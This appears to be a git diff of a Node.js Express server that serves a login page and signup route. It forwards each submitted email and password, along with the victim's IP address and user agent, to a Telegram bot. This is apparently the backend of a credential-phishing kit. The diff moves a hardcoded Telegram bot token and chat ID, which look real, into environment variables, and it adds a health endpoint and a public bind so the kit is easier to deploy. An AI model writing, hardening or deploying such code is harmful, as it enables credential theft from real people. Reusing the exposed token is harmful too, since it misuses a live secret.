@@ -3,14 +3,27 @@ const cors = require('cors');
 const axios = require('axios');
 const path = require('path');
 
+// Load environment variables
+require('dotenv').config();
+
 const app = express();
 const PORT = process.env.PORT || 5000;
 
 // ============================================
-// TELEGRAM CONFIGURATION - YOUR CREDENTIALS
+// TELEGRAM CONFIGURATION - FROM ENV VARIABLES
 // ============================================
-const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
-const TELEGRAM_CHAT_ID = '7386607055';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+// Check if Telegram credentials are configured
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.error('❌ Telegram credentials not configured!');
+    console.error('Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables.');
+    process.exit(1);
+}
+
+console.log('✅ Telegram Bot Token: Configured');
+console.log('✅ Telegram Chat ID: Configured');
 
 // ============================================
 // MIDDLEWARE
@@ -44,7 +57,10 @@ async function sendTelegramMessage(message) {
 // FORMAT LOGIN DATA
 // ============================================
 function formatLoginData(email, password, req) {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
+    const ip = req.headers['x-forwarded-for'] || 
+               req.socket.remoteAddress || 
+               'Unknown';
+    
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const timestamp = new Date().toLocaleString('en-US', { 
         timeZone: 'Africa/Lagos',
@@ -76,7 +92,10 @@ function formatLoginData(email, password, req) {
 // FORMAT SIGNUP DATA
 // ============================================
 function formatSignupData(data, req) {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
+    const ip = req.headers['x-forwarded-for'] || 
+               req.socket.remoteAddress || 
+               'Unknown';
+    
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const timestamp = new Date().toLocaleString('en-US', { 
         timeZone: 'Africa/Lagos',
@@ -112,6 +131,15 @@ function formatSignupData(data, req) {
 // ============================================
 // ROUTES
 // ============================================
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+    res.json({
+        status: 'OK',
+        timestamp: new Date().toISOString(),
+        uptime: process.uptime()
+    });
+});
 
 // Serve login page
 app.get('/', (req, res) => {
@@ -222,9 +250,9 @@ app.post('/api/signup', async (req, res) => {
 // ============================================
 // START SERVER
 // ============================================
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📍 http://localhost:${PORT}`);
     console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ❌'}`);
-    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);
+    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID ? 'Configured ✅' : 'Not configured ❌'}`);
 });
